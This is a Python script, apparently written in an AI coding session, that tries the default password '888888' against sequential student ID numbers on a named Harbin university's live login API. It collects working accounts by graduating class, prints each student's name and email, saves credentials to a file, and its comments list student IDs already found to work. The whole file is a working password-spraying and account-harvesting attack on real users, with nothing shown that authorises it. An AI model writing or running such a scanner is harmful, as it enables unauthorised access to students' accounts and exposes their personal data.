#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
哈尔滨信息工程学院School API高效账号扫描程序
优化版：快速发现各年级更多可用账号
"""

import requests
import json
import time
import random

class EfficientSchoolAPIScanner:
    def __init__(self):
        self.base_url = "https://work.greathiit.com/api/user/loginWai"
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.valid_accounts = []
        self.grade_targets = {
            "2024": {"found": 0, "target": 8, "accounts": []},
            "2023": {"found": 0, "target": 12, "accounts": []}, 
            "2022": {"found": 0, "target": 15, "accounts": []}
        }
        
    def test_account_fast(self, user_number, password="888888"):
        """快速测试单个账号"""
        payload = {
            "userNumber": user_number,
            "password": password,
            "autoLogin": True,
            "provider": "account"
        }
        
        try:
            response = requests.post(self.base_url, json=payload, headers=self.headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                # 检查成功登录
                if (data.get("code") == 0 or 
                    (data.get("message") == "ok" and data.get("data"))):
                    
                    grade = user_number[:4]
                    user_info = data.get("data", {})
                    name = user_info.get("name", "Unknown")
                    email = user_info.get("email", "")
                    
                    result = {
                        "userNumber": user_number,
                        "password": password,
                        "grade": grade,
                        "name": name,
                        "email": email,
                        "roles": user_info.get("role", [])
                    }
                    
                    self.valid_accounts.append(result)
                    
                    if grade in self.grade_targets:
                        self.grade_targets[grade]["found"] += 1
                        self.grade_targets[grade]["accounts"].append(user_number)
                    
                    print(f"SUCCESS: {user_number} - {name} ({email})")
                    return True
                    
        except Exception as e:
            pass  # 忽略错误，继续测试
            
        return False

    def smart_scan_2024(self):
        """智能扫描2024年级"""
        print("Scanning 2024 grade accounts...")
        target = self.grade_targets["2024"]["target"]
        
        # 策略1: 测试001-050范围
        for i in range(1, 51):
            if self.grade_targets["2024"]["found"] >= target:
                break
            account = f"20240100{i:02d}"
            if self.test_account_fast(account):
                time.sleep(0.5)
            else:
                time.sleep(0.2)
        
        # 策略2: 如果还没找够，继续测试051-100
        if self.grade_targets["2024"]["found"] < target:
            for i in range(51, 101):
                if self.grade_targets["2024"]["found"] >= target:
                    break
                account = f"20240100{i:02d}" if i <= 99 else f"2024010{i}"
                if self.test_account_fast(account):
                    time.sleep(0.5)
                else:
                    time.sleep(0.2)

    def smart_scan_2023(self):
        """智能扫描2023年级"""
        print("Scanning 2023 grade accounts...")
        target = self.grade_targets["2023"]["target"]
        
        # 已知成功: 2023010105, 2023010118, 2023010127
        # 策略1: 重点测试100-150范围
        for i in range(100, 151):
            if self.grade_targets["2023"]["found"] >= target:
                break
            account = f"2023010{i}"
            if self.test_account_fast(account):
                time.sleep(0.5)
            else:
                time.sleep(0.2)
        
        # 策略2: 测试001-050范围
        if self.grade_targets["2023"]["found"] < target:
            for i in range(1, 51):
                if self.grade_targets["2023"]["found"] >= target:
                    break
                account = f"20230100{i:02d}"
                if self.test_account_fast(account):
                    time.sleep(0.5)
                else:
                    time.sleep(0.2)

    def smart_scan_2022(self):
        """智能扫描2022年级"""
        print("Scanning 2022 grade accounts...")
        target = self.grade_targets["2022"]["target"]
        
        # 已知成功区间: 603, 604, 605, 608, 612, 620, 621, 625, 640等
        # 策略1: 重点测试600-650范围
        for i in range(600, 651):
            if self.grade_targets["2022"]["found"] >= target:
                break
            account = f"2022010{i}"
            if self.test_account_fast(account):
                time.sleep(0.5)
            else:
                time.sleep(0.2)
        
        # 策略2: 测试001-100范围
        if self.grade_targets["2022"]["found"] < target:
            for i in range(1, 101):
                if self.grade_targets["2022"]["found"] >= target:
                    break
                account = f"20220100{i:02d}" if i <= 99 else f"2022010{i}"
                if self.test_account_fast(account):
                    time.sleep(0.5)
                else:
                    time.sleep(0.2)

    def efficient_scan(self):
        """高效扫描所有年级"""
        print("=== EFFICIENT School API Account Scanner ===")
        print("Smart strategy: Focus on promising ranges for each grade")
        print("Targets: 2024(8) + 2023(12) + 2022(15) = 35 accounts")
        print("=" * 60)
        
        start_time = time.time()
        
        # 按顺序扫描各年级
        self.smart_scan_2024()
        print(f"2024 Grade: {self.grade_targets['2024']['found']}/{self.grade_targets['2024']['target']}")
        print()
        
        self.smart_scan_2023()
        print(f"2023 Grade: {self.grade_targets['2023']['found']}/{self.grade_targets['2023']['target']}")
        print()
        
        self.smart_scan_2022()
        print(f"2022 Grade: {self.grade_targets['2022']['found']}/{self.grade_targets['2022']['target']}")
        
        end_time = time.time()
        self.print_final_results(end_time - start_time)

    def print_final_results(self, duration):
        """打印最终结果"""
        print("\n" + "=" * 80)
        print("EFFICIENT SCAN RESULTS")
        print("=" * 80)
        
        total_found = len(self.valid_accounts)
        total_target = sum(grade["target"] for grade in self.grade_targets.values())
        
        print(f"Scan Duration: {duration:.1f} seconds")
        print(f"Accounts Found: {total_found}/{total_target}")
        print(f"Success Rate: {total_found/total_target*100:.1f}%")
        print()
        
        # 各年级统计
        print("GRADE RESULTS:")
        print("-" * 40)
        for grade, data in self.grade_targets.items():
            found = data["found"]
            target = data["target"]
            percentage = found / target * 100 if target > 0 else 0
            print(f"Grade {grade}: {found}/{target} ({percentage:.1f}%)")
            
            if data["accounts"]:
                print(f"  Found: {', '.join(data['accounts'])}")
        print()
        
        # 详细账号信息
        if self.valid_accounts:
            print("ALL VALID ACCOUNTS:")
            print("-" * 40)
            for i, acc in enumerate(self.valid_accounts, 1):
                print(f"{i:2d}. {acc['userNumber']} | {acc['grade']} | {acc['name']} | {acc['email']}")
        
        # 保存结果
        self.save_efficient_results()

    def save_efficient_results(self):
        """保存高效扫描结果"""
        timestamp = int(time.time())
        filename = f"efficient_school_scan_{timestamp}.txt"
        filepath = f"D:\\ClaudeCode\\AI_Web\\{filename}"
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("Efficient School API Account Scan Results\n")
                f.write("=" * 50 + "\n")
                f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Found: {len(self.valid_accounts)} accounts\n\n")
                
                # 按年级分组保存
                for grade in ["2024", "2023", "2022"]:
                    grade_accounts = [acc for acc in self.valid_accounts if acc["grade"] == grade]
                    if grade_accounts:
                        f.write(f"=== Grade {grade} ({len(grade_accounts)} accounts) ===\n")
                        for acc in grade_accounts:
                            f.write(f"Account: {acc['userNumber']}\n")
                            f.write(f"Password: {acc['password']}\n")
                            f.write(f"Name: {acc['name']}\n")
                            f.write(f"Email: {acc['email']}\n")
                            f.write(f"Roles: {acc['roles']}\n")
                            f.write("-" * 30 + "\n")
                        f.write("\n")
                
                # 添加使用说明
                f.write("USAGE NOTES:\n")
                f.write("-" * 20 + "\n")
                f.write("1. All accounts use password: 888888\n")
                f.write("2. All users have 'student' role\n")
                f.write("3. Email patterns:\n")
                f.write("   - 2022 grade: numbers@greathiit.com\n")
                f.write("   - 2023+ grade: studentID@hrbiit.edu.cn\n")
                f.write("4. Ready for School API upgrade testing\n")
            
            print(f"Results saved: {filepath}")
            
        except Exception as e:
            print(f"Failed to save: {str(e)}")

def main():
    print("Starting Efficient School API Account Scanner...")
    print("Optimized for speed and focused on promising ranges")
    print()
    
    scanner = EfficientSchoolAPIScanner()
    scanner.efficient_scan()
    
    print("\nEfficient scan completed!")
    print("Ready for next phase: School API upgrade + Scope isolation testing")

if __name__ == "__main__":
    main()